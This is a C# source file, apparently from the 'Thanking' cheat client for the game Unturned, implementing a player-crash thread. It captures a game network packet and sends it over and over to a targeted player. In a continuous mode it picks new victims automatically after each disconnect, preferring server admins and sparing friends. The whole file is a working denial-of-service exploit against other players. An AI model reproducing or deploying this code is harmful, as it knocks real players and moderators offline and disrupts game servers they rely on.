﻿using System;
 using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
 using Thanking.Options;
 using Thanking.Overrides;
 using Thanking.Utilities;
 using Thanking.Variables;
 using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static bool ContinuousPlayerCrash;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif
            Provider.onEnemyDisconnected += OnDisconnect;

            byte[] P1;
            int S1;
            int C1;
            
            while (true)
            {    
                if (Provider.isConnected)
                {
                    SteamChannel c = OptimizationVariables.MainPlayer.quests.channel;
                    c.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT, c.getCall("askCreateGroup"), out S1, out P1);

                    C1 = c.id;
                    break;
                }
                
                Thread.Sleep(1000);
            }

            while (true)
            {
                if (PlayerCrashEnabled)
                {
                    switch (MiscOptions.PCrashMethod)
                    {
                        case 1:
                        case 2:    
                        case 3:
                        case 4:
                        case 5:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, C1);
                            break;
                    }
                }
                
                else
                {
                    Thread.Sleep(1000);
                    if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
                        continue;

                    PlayerCrashEnabled = true;
                    Thread.Sleep(1000);
                    
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                }
            }
        }

        public static void OnDisconnect(SteamPlayer player)
        {
            if (player.playerID.steamID == CrashTarget)
            {
                if (!ContinuousPlayerCrash)
                    PlayerCrashEnabled = false;
                
                else
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
            }
        }  
    }
}
